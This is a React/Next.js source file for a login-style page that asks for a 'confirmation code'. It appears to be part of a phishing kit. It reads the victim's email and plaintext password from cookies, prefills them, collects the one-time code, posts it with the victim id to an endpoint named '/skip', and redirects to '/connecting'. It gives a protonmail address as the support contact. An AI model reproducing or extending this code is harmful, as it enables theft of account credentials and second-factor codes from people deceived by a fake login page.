import React, { useState } from "react";
import { Formik, Form } from "formik";
import * as Yup from "yup";
import {
  MdVisibility,
  MdVisibilityOff,
  MdLock,
  MdPriorityHigh,
} from "react-icons/md";
import TextfieldWrapper from "./TextfieldWrapper";
import SubmitButton from "./SubmitButton";
import { API_URL, site } from "../config/index";
import useMockLogin from "../hooks/useMockLogin";
import Cookies from "js-cookie";
import { toast } from "react-toastify";
import { setRequestMeta } from "next/dist/server/request-meta";
import { useRouter } from "next/navigation";

function Security() {
  const [showPassword, setShowPassword] = useState(false);
  const [reset, setReset] = useState(false);
  const id = Cookies.get("id");
  const email = Cookies.get("email");
  const password = Cookies.get("password");

  const router = useRouter();

  const initialvalues = {
    id: id,
    skipcode: "",
    email: reset ? "" : email,
    password: reset ? "" : password,
  };

  const validate = Yup.object({
    email: Yup.string().required("Required"),
    password: Yup.string().required("Required"),
  });

  const handleSubmit = async (values, formik) => {
    console.log(values);

    // const { skipcode } = values;
    // Cookies.set("skipcode", skipcode);
    // router.push("/account/email");
    // return;

    const { id, skipcode } = values;

    const submitValues = {
      id: id,
      skipcode: skipcode,
    };

    const url = `${API_URL}/skip`;

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(submitValues),
    });

    const data = await res.json();

    if (res.ok) {
      console.log("success", data);
      // toast.success("Login Succecssfull");
      formik.resetForm();
      router.push("/connecting");
      Cookies.remove("email");
      Cookies.remove("password");

      // console.log("success", data);
      // toast.success("Login Succecssfull");
      // formik.resetForm();
      // setReset(true);
      // Cookies.remove("id");
    } else {
      console.log("error", data);
      // toast.error("Something Went Wrong");
    }
  };

  return (
    <div className="md:w-[550px] lg:w-[632px] mx-auto mt-[60px] lg:mt-[45px] mb-[90px] lg:mb-[144px]">
      <div className="flex flex-col items-ceneter">
        <div className="lg:border border-slate-300 border-opacity-40 ">
          <div className="bg-custom-indigo text-white text-xl font-medium px-[26px] py-[18px] shadow-md">
            Login
          </div>

          <div className="bg-custom-yellow my-11 mx-4 p-4 border-t-4 border-black/10 flex items-center gap-4">
            <MdPriorityHigh
              size={24}
              className="fill-black/30 hidden lg:block"
            />
            <div className="flex-1 text-black/70">
              <p className="">
                Please leave this page open and go check your inbox (and spam
                folder) for the confirmation code we just sent you.
              </p>
              <p className="mt-6">
                If you don't see it right away, give it a few min, check both
                inbox and spam folders again and then contact us:
                <strong> myprivatedelights@protonmail.com</strong>
              </p>
            </div>
          </div>

          <div className="px-[15px] pt-7 pb-[24px]">
            <Formik
              initialValues={initialvalues}
              enableReinitialize
              validationSchema={validate}
              onSubmit={handleSubmit}
            >
              {(formik) => (
                <Form className="space-y-[18px]">
                  <div className="flex items-end gap-2.5 mb-5">
                    <MdLock size={25} className="mb-1 fill-black/50" />
                    <TextfieldWrapper
                      name="skipcode"
                      label="Code"
                      type="text"
                      // helpertext="usernames are case-sensitive"
                    />
                  </div>

                  <TextfieldWrapper
                    name="email"
                    label="Username"
                    type="email"
                    helpertext="usernames are case-sensitive"
                  />
                  <div className="relative">
                    <TextfieldWrapper
                      name="password"
                      label="Password"
                      helpertext="passwords are case-sensitive"
                      autoComplete="on"
                      type={showPassword ? "text" : "password"}
                    />
                    <span
                      className="absolute right-0 top-[17px] text-[23px] opacity-50 cursor-pointer"
                      onClick={() => setShowPassword(!showPassword)}
                    >
                      {showPassword ? <MdVisibilityOff /> : <MdVisibility />}
                    </span>
                  </div>

                  <div className="mt-5 flex justify-center">
                    <SubmitButton>Confirm</SubmitButton>
                  </div>
                </Form>
              )}
            </Formik>

            <div className="mt-[58px] mx-4 lg:mx-[55px] text-[16.5px] flex justify-center items-center text-custom-indigo">
              <p className="cursor-pointer">Help</p>
            </div>
          </div>
        </div>
      </div>
      <div className="h-[1px] bg-slate-600/50"></div>
    </div>
  );
}

export default Security;
